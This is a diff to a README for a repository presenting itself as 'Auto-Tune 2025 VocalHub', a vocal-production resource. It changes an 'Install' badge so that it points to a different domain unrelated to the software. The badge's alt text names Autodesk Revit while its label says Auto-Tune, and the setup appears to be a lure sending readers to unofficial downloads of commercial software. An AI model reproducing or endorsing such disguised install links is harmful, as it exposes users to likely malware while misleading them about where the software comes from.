@@ -5,7 +5,7 @@
 
 🎶 Elevate your vocal production with Auto-Tune 2025 VocalHub! This repository provides tutorials, resources, and best practices for music creators to enhance their audio projects in 2025.
 
-[![Install Autodesk Revit](https://img.shields.io/badge/Install-AUTOTUNE-blueviolet)](https://cea-groupe.com)
+[![Install Autodesk Revit](https://img.shields.io/badge/Install-AUTOTUNE-blueviolet)](https://glocktober.com)
 
 ### 🔊 Core Features
 
